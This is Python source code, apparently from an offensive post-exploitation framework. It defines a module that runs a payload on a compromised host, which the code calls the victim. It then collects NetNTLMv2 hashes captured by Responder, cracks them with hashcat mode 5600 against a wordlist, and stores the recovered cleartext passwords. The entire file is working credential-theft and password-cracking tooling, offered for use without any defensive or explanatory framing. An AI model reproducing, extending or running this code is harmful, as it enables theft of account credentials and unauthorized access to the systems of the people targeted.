from dataManager.repository.userRepository import UserRepository
import os
import aiofiles
import aiofiles.os
import asyncio
import logging
import tempfile

class CrackModule:
    def __init__(self, user_repository: UserRepository):
        self.module_name = "cracker"
        self.user_repository: UserRepository = user_repository

    async def fetch_responder(self, uuid):
        user = self.user_repository.get_user(uuid)
        if not user:
            logging.error("User not found with UUID: %s", uuid)
            raise Exception("User not found.")
        await user.execute("./modules/payloads/payload_fetch_responder.py")
        log_dir = '/responder_logs'
        logging.info(f"Checking for log files in {log_dir}")
        logging.info(f"Files: {os.listdir(log_dir)}")
        log_files = [f for f in os.listdir(log_dir) if f.startswith('HTTP-NTLMv2-') and f.endswith('.txt')]

        if not log_files:
            return {"message": "Could not retrieve NTLM hash. Verify that Responder is running, and that the victim's has access to it."}

        log_file_path = os.path.join(log_dir, log_files[0])

        async with aiofiles.open(log_file_path, mode='r') as f:
            ntlm = await f.readline() 
        logging.info(f"NTLM: {ntlm}")
        ntlm = ntlm.strip()
        current_module_data = user.get_module_data(self.module_name) or {}
        new_module_data = current_module_data
        
        if current_module_data:
            old_ntlms = new_module_data.get("old_ntlms", [])
            if "NetNTLM_v2" in current_module_data:
                old_ntlms.append({
                        "NetNTLM_v2": current_module_data["NetNTLM_v2"]
                    })
                if "cleartext_password" in new_module_data:
                    old_ntlms[-1]["cleartext_password"] = new_module_data["cleartext_password"]
                new_module_data["old_ntlms"] = old_ntlms
        new_module_data["NetNTLM_v2"] = ntlm
        new_module_data["cleartext_password"] = ""
        user.set_module_data(self.module_name, new_module_data)
        self.user_repository.save_user(user)

        await aiofiles.os.remove(log_file_path)

        return {"ntlm": ntlm}
    

    async def crack(self, uuid: str, wordlist_content: bytes):
        logging.info("Starting password crack process for user with UUID: %s", uuid)

        user = self.user_repository.get_user(uuid)

        if not user:
            logging.error("User not found with UUID: %s", uuid)
            raise Exception("User not found.")

        module_data = user.get_module_data(self.module_name)

        if "NetNTLM_v2" not in module_data:
            logging.error("NetNTLM_v2 hash not found in module data for UUID: %s", uuid)
            raise Exception("You need to retrieve the NTLM hash first.")

        hash_value = module_data["NetNTLM_v2"]

        if "cleartext_password" in module_data and module_data["cleartext_password"]:
            return {
                "password": module_data["cleartext_password"]
            }

        async with aiofiles.open("test_hash.txt", mode='w') as f:
            await f.write(hash_value)

        temp_file = tempfile.NamedTemporaryFile(delete=False)
        wordlist_path = temp_file.name
        temp_file.close()

        async with aiofiles.open(wordlist_path, 'wb') as temp_wordlist:
            await temp_wordlist.write(wordlist_content)
            logging.info(f"Wordlist successfully written to {wordlist_path}")

        command = ["hashcat", "-m", "5600", "test_hash.txt", wordlist_path, "-o", "cracked.txt"]
        process = await asyncio.create_subprocess_exec(*command)
        await process.wait()

        await aiofiles.os.remove(wordlist_path)

        if os.path.exists("cracked.txt"):
            
            async with aiofiles.open("cracked.txt", mode='r') as f:
                cracked_password = (await f.read()).split(":")[-1]

            module_data["cleartext_password"] = cracked_password
            logging.info(f"Password cracked for UUID: {uuid}: {cracked_password}")
            user.set_module_data(self.module_name, module_data)
            self.user_repository.save_user(user)

            await aiofiles.os.remove("test_hash.txt")
            await aiofiles.os.remove("cracked.txt")
            if module_data["cleartext_password"]:
                return {
                    "password": cracked_password
                }
            else:
                logging.error("Failed to crack the password for UUID: %s", uuid)
                raise Exception("Password is too strong for cracking.")
        else:
            logging.error("Failed to crack the password for UUID: %s", uuid)
            raise Exception("Failed to crack the password.")

